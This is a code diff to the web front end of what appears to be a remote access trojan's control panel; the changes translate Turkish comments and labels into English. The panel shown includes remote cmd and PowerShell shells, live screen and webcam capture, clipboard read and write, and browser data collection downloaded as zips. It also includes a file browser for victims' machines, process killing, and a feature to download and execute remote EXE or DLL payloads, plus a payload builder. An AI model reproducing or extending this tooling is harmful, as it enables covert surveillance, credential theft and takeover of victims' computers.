@@ -1,5 +1,5 @@
-<!□TYPE html>
-<html lang="tr">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,16 +9,16 @@
 <body>
     <div class="layout">
 
-        <!-- - Sol Sidebar - -->
+        <!-- - Left Sidebar - -->
         <aside class="sidebar" id="sidebar">
             <div class="sidebar-logo">
-                <span class="logo-icon">◈</span>
+                <span class="logo-icon">◎</span>
                 <span class="logo-text">Panel</span>
             </div>
 
             <nav class="sidebar-nav">
                 <button class="nav-item active" onclick="switchPage('home')" id="nav-home">
-                    <span class="nav-icon">Home</span>
+                    <span class="nav-icon">◎</span>
                     <span class="nav-label">Home</span>
                 </button>
                 <button class="nav-item" onclick="switchPage('clients')" id="nav-clients">
@@ -31,7 +31,7 @@
                     <span class="nav-label">Builder</span>
                 </button>
                 <button class="nav-item" onclick="switchPage('settings')" id="nav-settings">
-                    <span class="nav-icon">◈</span>
+                    <span class="nav-icon">⚙</span>
                     <span class="nav-label">Settings</span>
                 </button>
                 <button class="nav-item" onclick="switchPage('account')" id="nav-account">
@@ -48,20 +48,20 @@
             </div>
         </aside>
 
-        <!-- - Mobil Header - -->
+        <!-- - Mobile Header - -->
         <div class="mobile-header">
             <button class="hamburger" onclick="toggleSidebar()" id="hamburger">☰</button>
             <span class="mobile-title" id="mobile-title">Home</span>
             <a href="/logout" class="mobile-logout">⏻</a>
         </div>
 
-        <!-- - Sidebar Overlay (mobil) - -->
+        <!-- - Sidebar Overlay (mobile) - -->
         <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
 
         <!-- - Main Content - -->
         <main class="main-content">
 
-            <!-- ══════════ HOME ══════════ -->
+            <!-- HOME -->
             <div class="page" id="page-home">
                 <div class="page-header">
                     <h2>Home</h2>
@@ -88,7 +88,7 @@
                         <div class="stat-icon">⚡</div>
                         <div class="stat-info">
                             <div class="stat-value" id="stat-goroutines">0</div>
-                            <div class="stat-label">Goroutine</div>
+                            <div class="stat-label">Goroutines</div>
                         </div>
                     </div>
                     <div class="stat-card accent-orange">
@@ -100,7 +100,7 @@
                     </div>
                 </div>
 
-                <!-- Server bilgileri -->
+                <!-- Server info -->
                 <div class="info-grid">
                     <div class="info-card">
                         <div class="info-card-title">Server Information</div>
@@ -145,7 +145,7 @@
                 <div class="info-card" style="margin-top:16px;">
                     <div class="info-card-title" style="display:flex;justify-content:space-between;align-items:center;">
                         <span>Recently Connected Clients</span>
-                        <button class="mini-btn" onclick="switchPage('clients')">See All →</button>
+                        <button class="mini-btn" onclick="switchPage('clients')">See All ›</button>
                     </div>
                     <div id="home-client-list" class="home-client-list">
                         <div class="empty-mini">No clients connected yet.</div>
@@ -153,7 +153,7 @@
                 </div>
             </div>
 
-            <!-- ══════════ CLIENTS ══════════ -->
+            <!-- CLIENTS -->
             <div class="page" id="page-clients" style="display:none;">
                 <div class="clients-layout">
                     <!-- Left: List -->
@@ -258,7 +258,7 @@
                                     </div>
                                 </div>
                                 <button class="tab-btn" id="tab-clipboard" onclick="switchTab('clipboard')">
-                                    <span class="tab-icon">◧</span>
+                                    <span class="tab-icon">⚡</span>
                                     Clipboard
                                 </button>
                                 <button class="tab-btn" id="tab-client-settings" onclick="switchTab('client-settings')">
@@ -356,7 +356,7 @@
                                                inputmode="none" />
                                         <button class="term-send-btn" onclick="sendShellCommand()">↵</button>
                                     </div>
-                                    <!-- Mobil klavye -->
+                                    <!-- Mobile keyboard -->
                                     <div class="mobile-keyboard" id="mobile-keyboard" style="display:none;">
                                         <div class="mkb-input-row">
                                             <input type="text" id="mobile-shell-input" class="mkb-input"
@@ -419,7 +419,7 @@
                                             <input type="file" id="fb-upload-input" multiple style="display:none;" onchange="fbUploadFiles(this)" />
                                         </label>
                                     </div>
-                                    <!-- Dosya listesi -->
+                                    <!-- List -->
                                     <div class="fb-list-wrap" id="fb-list-wrap">
                                         <div class="fb-empty" id="fb-empty">
                                             <span class="fb-empty-icon">◫</span>
@@ -457,7 +457,7 @@
                                     <div class="rfe-toolbar">
                                         <span class="rfe-toolbar-title">Remote File Execution</span>
                                         <div class="rfe-type-toggle">
-                                            <button class="rfe-type-btn active" id="rfe-btn-exe" onclick="rfeSetType('exe')">⚙</button>
+                                            <button class="rfe-type-btn active" id="rfe-btn-exe" onclick="rfeSetType('exe')">EXE</button>
                                             <button class="rfe-type-btn" id="rfe-btn-dll" onclick="rfeSetType('dll')">DLL</button>
                                         </div>
                                     </div>
@@ -468,7 +468,7 @@
                                         <div class="rfe-card">
                                             <div class="rfe-card-head">
                                                 <span class="rfe-card-icon">◈</span>
-                                                <span class="rfe-card-title" id="rfe-card-title">Execute ⚙</span>
+                                                <span class="rfe-card-title" id="rfe-card-title">Execute EXE</span>
                                             </div>
                                             <div class="rfe-card-body">
                                                 <!-- URL -->
@@ -483,7 +483,7 @@
                                                     <span class="rfe-hint">Full URL of the file to be downloaded and executed</span>
                                                 </div>
 
-                                                <!-- Args (⚙ only) -->
+                                                <!-- Args (EXE only) -->
                                                 <div class="rfe-row" id="rfe-args-row">
                                                     <label class="rfe-label">Arguments <span class="rfe-label-opt">(optional)</span></label>
                                                     <div class="rfe-input-wrap">
@@ -492,7 +492,7 @@
                                                                placeholder="/silent /install"
                                                                autocomplete="off" spellcheck="false" />
                                                     </div>
-                                                    <span class="rfe-hint">Command line parameters to be passed to the ⚙</span>
+                                                    <span class="rfe-hint">Command line parameters to be passed to the EXE</span>
                                                 </div>
 
                                                 <!-- DLL Note -->
@@ -589,7 +589,7 @@
                             <!-- Client Settings -->
                             <div class="tab-content" id="content-client-settings" style="display:none;">
                                 <div class="cs-wrapper">
-                                    <!-- Sol: Aksiyon Paneli -->
+                                    <!-- Left: Actions Panel -->
                                     <div class="cs-actions-panel">
                                         <div class="cs-actions-title">Client Actions</div>
 
@@ -635,10 +635,9 @@
                                                 <button class="settings-save-btn" onclick="setClientDelay()">Apply</button>
                                             </div>
                                         </div>
-                                        <button class="settings-save-btn" style="width: 100%; margin-top: 10px;" onclick="saveClientSettings()">Save Identity Info</button>
+                                        <button class="settings-save-btn" style="width: 100%; margin-top: 10px;" onclick="saveClientSettings()">Save Info</button>
                                     </div>
 
-                                    <!-- Sağ: Sistem Bilgileri -->
                                     <!-- Right: System Information -->
                                     <div class="cs-info-panel">
                                         <div class="cs-info-title">System Information</div>
@@ -892,7 +891,7 @@
                 </div>
             </div>
 
-            <!-- ══════════ SETTINGS ══════════ -->
+            <!-- SETTINGS -->
             <div class="page" id="page-settings" style="display:none;">
                 <div class="page-header">
                     <h2>Settings</h2>
@@ -938,7 +937,7 @@
                 </div>
             </div>
 
-            <!-- ══════════ ACCOUNT ══════════ -->
+            <!-- ACCOUNT -->
             <div class="page" id="page-account" style="display:none;">
                 <div class="page-header">
                     <h2>Account</h2>
@@ -1010,7 +1009,7 @@
             return response;
         }
 
-        // - Page Switching ----------──
+        // - Page Switching
         const pages = ['home', 'clients', 'builder', 'settings', 'account'];
         const pageTitles = { home: 'Home', clients: 'Clients', builder: 'Builder', settings: 'Settings', account: 'Account' };
 
@@ -1036,7 +1035,7 @@
             closeSidebar();
         }
 
-        // - Sidebar (mobil) ---------─
+        // - Sidebar
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('open');
             document.getElementById('sidebar-overlay').classList.toggle('open');
@@ -1046,7 +1045,7 @@
             document.getElementById('sidebar-overlay').classList.remove('open');
         }
 
-        // - Settings ------------
+        // - Settings
         async function loadSettings() {
             try {
                 const res = await apiFetch('/api/settings', { credentials: 'include' });
@@ -1055,7 +1054,7 @@
                 document.getElementById('settings-tcp-port').value = s.tcp_port || '';
                 document.getElementById('settings-tcp-current').textContent = ':' + (s.tcp_port || '-');
                 document.getElementById('settings-heartbeat').value = s.heartbeat_interval || '';
-                document.getElementById('settings-heartbeat-current').textContent = (s.heartbeat_interval || '-') + ' sn';
+                document.getElementById('settings-heartbeat-current').textContent = (s.heartbeat_interval || '-') + ' s';
             } catch (e) {}
         }
 
@@ -1125,7 +1124,7 @@
             if (type === 'loading') el.classList.add('settings-status-loading');
         }
 
-        // - Home Stats -----------─
+        // - Home Stats
         let statsInterval = null;
 
         function startStatsPolling() {
@@ -1154,7 +1153,7 @@
             } catch (e) {}
         }
 
-        // - Client List ----------
+        // - Client List
         let selectedID = null;
         let selectedClientData = {};
         let currentShell = 'cmd';
@@ -1175,18 +1174,16 @@
             shellState.cmd = { seenIndex: 0, clearedAt: 0 };
             shellState.ps  = { seenIndex: 0, clearedAt: 0 };
 
-            // Stop if streaming is active
             if (isScreening) { isScreening = false; stopScreenPoll(); updateScreenUI(false); }
             if (isCaming)    { isCaming    = false; stopCamPoll();    updateCamUI(false);    }
-            // Reset task manager
+
             taskData = [];
             document.getElementById('task-empty').style.display = 'flex';
             document.getElementById('taskmgr-table').style.display = 'none';
-            document.getElementById('task-count').textContent = '- process';
+            document.getElementById('task-count').textContent = '- processes';
             document.getElementById('task-search').value = '';
             setTaskStatus('', '');
             stopTaskAutoRefresh();
-            // Reset file browser
             fbReset();
 
             document.querySelectorAll('.client-row').forEach(r => r.classList.remove('active'));
@@ -1198,13 +1195,12 @@
             document.getElementById('detail-id').textContent      = '#' + id;
             document.getElementById('detail-time').textContent    = connTime;
             document.getElementById('detail-win').textContent     = winver  || '';
-            document.getElementById('detail-desktop').textContent = desktop ? '\u{1F5A5} ' + desktop : '';
-            document.getElementById('detail-av').textContent      = av      ? '\u{1F6E1} ' + av : '';
+            document.getElementById('detail-desktop').textContent = desktop ? '💻 ' + desktop : '';
+            document.getElementById('detail-av').textContent      = av      ? '🛡 ' + av : '';
             document.getElementById('detail-country').textContent = country || '';
             document.getElementById('msg-status').textContent     = '';
             document.getElementById('msg-input').value            = '';
 
-            // Client settings verilerini sakla
             selectedClientData = { id, ip, connTime, winver, desktop, av, country, gpu, cpu, ram, disk, process, nickname, note };
 
             switchTab('msg');
@@ -1246,6 +1242,7 @@
             document.getElementById('content-browse-social').style.display   = tab === 'browse-social'   ? 'flex'  : 'none';
             document.getElementById('content-clipboard').style.display       = tab === 'clipboard'       ? 'flex'  : 'none';
             document.getElementById('content-client-settings').style.display = tab === 'client-settings' ? 'flex'  : 'none';
+
             document.getElementById('tab-msg').classList.toggle('active', tab === 'msg');
             document.getElementById('tab-shell').classList.toggle('active', tab === 'shell');
             document.getElementById('tab-screen').classList.toggle('active', tab === 'screen');
@@ -1256,6 +1253,7 @@
             document.getElementById('tab-browse').classList.toggle('active', tab === 'browse-browser' || tab === 'browse-social');
             document.getElementById('tab-clipboard').classList.toggle('active', tab === 'clipboard');
             document.getElementById('tab-client-settings').classList.toggle('active', tab === 'client-settings');
+
             document.getElementById('shell-menu').classList.remove('open');
             document.getElementById('browse-menu').classList.remove('open');
 
@@ -1321,7 +1319,7 @@
             switchTab('browse-' + type);
         }
 
-        // - Collect Browser Data --------
+        // - Collect Browser Data
         async function collectBrowserData(browser) {
             if (!selectedID) {
                 setBrowseBrowserStatus('Select a client first.', 'error');
@@ -1341,17 +1339,14 @@
                     body: JSON.stringify({ id: selectedID, browser: browser })
                 });
 
-                // Server always returns JSON (ok:true → data:base64zip, ok:false → error:message)
                 const data = await res.json();
 
                 if (!data.ok) {
-                    // Error state
                     const errMsg = data.error || 'Data could not be collected.';
                     statusEl.textContent = '✕';
                     statusEl.className = 'collect-status collect-err';
                     setBrowseBrowserStatus('✕ ' + errMsg, 'error');
                 } else {
-                    // Success: base64 zip → blob → automatic download
                     const zipName = data.name || (browser.charAt(0).toUpperCase() + browser.slice(1) + '_collect.zip');
                     const b64 = data.data || '';
                     if (b64) {
@@ -1367,7 +1362,7 @@
                     }
                     statusEl.textContent = '✓';
                     statusEl.className = 'collect-status collect-ok';
-                    setBrowseBrowserStatus('✓ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' data successfully collected → ' + zipName, 'ok');
+                    setBrowseBrowserStatus('✓ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' data successfully collected.', 'ok');
                 }
             } catch (e) {
                 statusEl.textContent = '✕';
@@ -1494,8 +1489,24 @@
             if (outputPollInterval) { clearInterval(outputPollInterval); outputPollInterval = null; }
         }
 
+        async function pollOutput() {
+            if (!selectedID) return;
+            const state = shellState[currentShell];
+            try {
+                const res = await apiFetch(`/api/output?id=${selectedID}`, { credentials: 'include' });
+                if (!res.ok) return;
+                const outputs = await res.json();
+                if (!outputs || !outputs.length) return;
+                const filtered = outputs.filter(o => o.kind === currentShell);
+                for (let i = state.seenIndex; i < filtered.length; i++) {
+                    if (i >= state.clearedAt) appendTerminalLine('output', filtered[i].data);
+                }
+                state.seenIndex = filtered.length;
+            } catch (e) {}
+        }
 
-        // - Live Camera -----------
+
+        // - Live Camera
         let camPollInterval = null;
         let isCaming = false;
         let currentCamFps = 10;
@@ -1592,7 +1603,7 @@
             } catch (e) {}
         }
 
-        // - Live Screen -----------
+        // - Live Screen
         let screenPollInterval = null;
         let isScreening = false;
         let currentFps = 10;
@@ -1600,14 +1611,12 @@
         function onFpsChange(val) {
             currentFps = parseInt(val);
             document.getElementById('fps-value').textContent = val;
-            // If streaming is active, apply new FPS immediately
             if (isScreening && selectedID) {
                 apiFetch('/api/screen/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
                 }).catch(() => {});
-                // Update poll speed too
                 startScreenPoll();
             }
         }
@@ -1691,24 +1700,8 @@
             } catch (e) {}
         }
 
-        async function pollOutput() {
-            if (!selectedID) return;
-            const state = shellState[currentShell];
-            try {
-                const res = await apiFetch(`/api/output?id=${selectedID}`, { credentials: 'include' });
-                if (!res.ok) return;
-                const outputs = await res.json();
-                if (!outputs || !outputs.length) return;
-                const filtered = outputs.filter(o => o.kind === currentShell);
-                for (let i = state.seenIndex; i < filtered.length; i++) {
-                    if (i >= state.clearedAt) appendTerminalLine('output', filtered[i].data);
-                }
-                state.seenIndex = filtered.length;
-            } catch (e) {}
-        }
-
-        // - Task Manager ----------──
-        let taskData       = [];   // all process list
+        // - Task Manager
+        let taskData       = [];
         let taskSortCol    = 'mem';
         let taskSortAsc    = false;
         let taskAutoInterval = null;
@@ -1747,7 +1740,6 @@
                 p.pid.toString().includes(search)
             );
 
-            // Sorting
             list.sort((a, b) => {
                 let va = a[taskSortCol], vb = b[taskSortCol];
                 if (taskSortCol === 'pid' || taskSortCol === 'cpu' || taskSortCol === 'mem') {
@@ -1762,7 +1754,7 @@
                 return 0;
             });
 
-            document.getElementById('task-count').textContent = `${list.length} / ${taskData.length} process`;
+            document.getElementById('task-count').textContent = `${list.length} / ${taskData.length} processes`;
             document.getElementById('task-empty').style.display = 'none';
             const table = document.getElementById('taskmgr-table');
             table.style.display = '';
@@ -1788,7 +1780,6 @@
                 </tr>`;
             }).join('');
 
-            // Update sort arrows
             ['pid','name','cpu','mem'].forEach(col => {
                 const el = document.getElementById('sort-' + col);
                 if (!el) return;
@@ -1827,7 +1818,6 @@
                 const data = await res.json();
                 if (data.success) {
                     setTaskStatus('success', `✓ PID ${pid} terminated`);
-                    // Remove row from table immediately
                     taskData = taskData.filter(p => parseInt(p.pid) !== pid);
                     renderTasks();
                 } else {
@@ -1858,14 +1848,14 @@
             if (taskAutoInterval) { clearInterval(taskAutoInterval); taskAutoInterval = null; }
         }
 
-        // - File Browser -----------
-        let fbCurrentPath  = null;   // null = not opened yet
-        let fbHistory      = [];     // back history
-        let fbData         = [];     // items of current directory
+        // - File Browser
+        let fbCurrentPath  = null;
+        let fbHistory      = [];
+        let fbData         = [];
         let fbSep          = '/';
         let fbSortCol      = 'name';
         let fbSortAsc      = true;
-        let fbCtxTarget    = null;   // right click target {name, type, fullPath}
+        let fbCtxTarget    = null;
         let fbLoading      = false;
 
         function fbReset() {
@@ -1894,7 +1884,6 @@
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
 
-                // Add to history
                 if (fbCurrentPath !== null && fbCurrentPath !== path) {
                     fbHistory.push(fbCurrentPath);
                 }
@@ -1917,7 +1906,6 @@
         function fbGoBack()  { if (fbHistory.length) fbNavigate(fbHistory.pop()); }
         function fbGoUp() {
             if (!fbCurrentPath) return;
-            // Windows: C:\ → root (empty), Linux: /a/b → /a
             const parts = fbCurrentPath.replace(/[/\\]+$/, '').split(/[/\\]/);
             if (parts.length <= 1) { fbNavigate(''); return; }
             parts.pop();
@@ -1963,7 +1951,6 @@
             empty.style.display = 'none';
             table.style.display = '';
 
-            // Sort: folders first, then files
             let dirs  = fbData.filter(i => i.type === 'dir' || i.type === 'drive');
             let files = fbData.filter(i => i.type === 'file');
 
@@ -2000,7 +1987,6 @@
                 </tr>`;
             }).join('');
 
-            // Sort arrows
             ['name','size','mtime'].forEach(col => {
                 const el = document.getElementById('fb-sort-' + col);
                 if (el) el.textContent = col === fbSortCol ? (fbSortAsc ? '↑' : '↓') : '';
@@ -2008,7 +1994,7 @@
         }
 
         function fbBuildPath(name) {
-            if (!fbCurrentPath) return name; // drive selection
+            if (!fbCurrentPath) return name;
             const trail = fbCurrentPath.endsWith(fbSep) ? '' : fbSep;
             return fbCurrentPath + trail + name;
         }
@@ -2017,11 +2003,6 @@
             if (fbSortCol === col) fbSortAsc = !fbSortAsc;
             else { fbSortCol = col; fbSortAsc = col === 'name'; }
             fbRenderList();
-        }
-
-        function fbRowDblClick(type, fullPath) {
-            if (type === 'dir' || type === 'drive') fbNavigate(fullPath);
-            else fbDownload(fullPath, fullPath.split(/[/\\]/).pop());
         }
 
         function fbIcon(item) {
@@ -2057,7 +2038,7 @@
             return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
         }
 
-        // - Download -------------
+        // - Download
         async function fbDownload(path, name) {
             fbSetStatus('info', `↓ Downloading: ${name}...`);
             try {
@@ -2069,7 +2050,6 @@
                 if (!res.ok) { fbSetStatus('error', 'Download error: ' + res.status); return; }
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
-                // Base64 → Blob → click
                 const bytes = atob(data.data);
                 const arr   = new Uint8Array(bytes.length);
                 for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
@@ -2083,7 +2063,7 @@
             } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // - Delete -------------──
+        // - Delete
         async function fbDelete(path) {
             try {
                 const res = await apiFetch('/api/fb/delete', {
@@ -2099,7 +2079,7 @@
             } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // - New Folder -----------
+        // - New Folder
         async function fbMkdirPrompt() {
             const name = prompt('New folder name:');
             if (!name || !name.trim()) return;
@@ -2117,7 +2097,7 @@
             } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // - Upload -------------
+        // - Upload
         async function fbUploadFiles(input) {
             const files = Array.from(input.files);
             if (!files.length) return;
@@ -2147,12 +2127,11 @@
             fbRefresh();
         }
 
-        // - Rename ---------─
+        // - Rename
         async function fbRename(oldPath, oldName) {
             const newName = prompt('New name:', oldName);
             if (!newName || !newName.trim() || newName.trim() === oldName) return;
             const trimmedName = newName.trim();
-            // find separator (\ or /) correctly
             const sepIdx  = Math.max(oldPath.lastIndexOf('\\'), oldPath.lastIndexOf('/'));
             const dir     = sepIdx >= 0 ? oldPath.substring(0, sepIdx + 1) : '';
             const newPath = dir + trimmedName;
@@ -2169,7 +2148,7 @@
             } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // - Context Menu ----------──
+        // - Context Menu
         function fbShowCtx(e, name, type, fullPath) {
             e.preventDefault();
             fbCtxTarget = { name, type, fullPath };
@@ -2221,7 +2200,7 @@
             bar.className = 'fb-statusbar' + (type ? ' status-' + type : '');
         }
 
-        // - Keyboard ------------
+        // - Keyboard
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
                 const active = document.activeElement;
@@ -2243,7 +2222,7 @@
             }
         });
 
-        // - Update Client List -------
+        // - Update Client List
         async function refreshClients() {
             try {
                 const res = await apiFetch('/api/clients', { credentials: 'include' });
@@ -2324,7 +2303,7 @@
             }
         });
 
-        // - Terminal Resize ---------──
+        // - Terminal Resize
         (function() {
             let isResizing = false;
             let startY = 0;
@@ -2360,7 +2339,6 @@
             document.addEventListener('mousemove', onMove);
             document.addEventListener('touchmove', onMove, { passive: false });
 
-            // Attach event when handle is ready
             function attachHandle() {
                 const h = getHandle();
                 if (!h) return;
@@ -2368,7 +2346,6 @@
                 h.addEventListener('touchstart', onStart, { passive: false });
             }
 
-            // Wait until DOM is ready
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', attachHandle);
             } else {
@@ -2376,7 +2353,7 @@
             }
         })();
 
-        // - Remote File Execution -------──
+        // - Remote File Execution
         let rfeType = 'exe';
 
         function rfeSetType(type) {
@@ -2385,7 +2362,7 @@
             document.getElementById('rfe-btn-dll').classList.toggle('active', type === 'dll');
             document.getElementById('rfe-args-row').style.display  = type === 'exe' ? 'flex' : 'none';
             document.getElementById('rfe-dll-note').style.display  = type === 'dll' ? 'flex' : 'none';
-            document.getElementById('rfe-card-title').textContent  = type === 'exe' ? 'Execute ⚙' : 'Execute DLL';
+            document.getElementById('rfe-card-title').textContent  = type === 'exe' ? 'Execute EXE' : 'Execute DLL';
             document.getElementById('rfe-url').placeholder = type === 'exe'
                 ? 'example.com/payload.exe'
                 : 'example.com/payload.dll';
@@ -2408,7 +2385,6 @@
             const urlVal = document.getElementById('rfe-url').value.trim();
             const args   = document.getElementById('rfe-args').value.trim();
 
-            // Add http:// prefix to URL if missing
             let url = urlVal;
             if (url && !/^https?:\/\//i.test(url)) url = 'http://' + url;
 
@@ -2466,7 +2442,7 @@
             rfeSetStatus('', 'Ready');
         }
 
-        // - Clipboard Manager ----------─
+        // - Clipboard Manager
         function cbSetStatus(type, msg) {
             const sb = document.getElementById('cb-statusbar');
             sb.textContent = msg;
@@ -2495,7 +2471,6 @@
                     cbSetStatus('err', 'Server error: ' + await res.text());
                 } else {
                     const data = await res.json();
-                    // unescape \n
                     const text = (data.text || '').replace(/\\n/g, '\n');
                     document.getElementById('cb-read-area').value = text;
                     cbSetStatus('ok', 'Successfully read - ' + text.length + ' characters');
@@ -2548,7 +2523,7 @@
                 .catch(() => cbSetStatus('err', 'Browser clipboard access denied.'));
         }
 
-        // - Client Settings ---------──
+        // - Client Settings
         function loadClientSettings() {
             const d = selectedClientData;
             document.getElementById('cs-desktop').textContent = d.desktop  || '-';
@@ -2591,7 +2566,6 @@
                 if (res.ok) {
                     statusEl.textContent = '✓ Settings saved.';
                     statusEl.className = 'cs-action-status cs-status-ok';
-                    // Update current data so it doesn't revert on tab switch
                     selectedClientData.nickname = nickname;
                     selectedClientData.note = note;
                     refreshClients();
@@ -2697,18 +2671,15 @@
             document.getElementById('remaining-time').textContent = `${days} days ${hours} hours`;
         }
 
-        // - Init -------------─
+        // - Init
         updateRemainingTime();
         startStatsPolling();
         setInterval(refreshClients, 3000);
         refreshClients();
 
-        // - File Browser Event Delegation -----
-        // (DOM ready, runs at the end of script body)
         ;(function() {
             const tbody = document.getElementById('fb-tbody');
 
-            // tbody: double click → open/download
             tbody.addEventListener('dblclick', e => {
                 const row = e.target.closest('tr.fb-row');
                 if (!row) return;
@@ -2718,7 +2689,6 @@
                     fbDownload(row.dataset.path, row.dataset.name);
             });
 
-            // tbody: act button click
             tbody.addEventListener('click', e => {
                 const btn = e.target.closest('.fb-act-btn');
                 if (!btn) return;
@@ -2728,7 +2698,6 @@
                 else fbDownload(row.dataset.path, row.dataset.name);
             });
 
-            // tbody: right click → context menu
             tbody.addEventListener('contextmenu', e => {
                 const row = e.target.closest('tr.fb-row');
                 if (!row) return;
@@ -2740,8 +2709,6 @@
                     fullPath: row.dataset.path,
                 };
                 const isDir = row.dataset.type === 'dir' || row.dataset.type === 'drive';
-                // Folder → show "Open/Enter", hide "Download"
-                // File   → hide "Open/Enter", show "Download"
                 document.getElementById('fb-ctx-btn-open').style.display     = isDir ? '' : 'none';
                 document.getElementById('fb-ctx-btn-download').style.display = isDir ? 'none' : '';
                 const menu = document.getElementById('fb-ctx-menu');
@@ -2753,14 +2720,12 @@
                 menu.style.top  = y + 'px';
             });
 
-            // Breadcrumb: click
             document.getElementById('fb-breadcrumb').addEventListener('click', e => {
                 const item = e.target.closest('.fb-bc-nav');
                 if (!item) return;
                 fbNavigate(item.dataset.bcpath);
             });
 
-            // Click anywhere → close ctx menu
             document.addEventListener('click', () => fbHideCtx());
             document.addEventListener('contextmenu', e => {
                 if (!e.target.closest('tr.fb-row')) fbHideCtx();
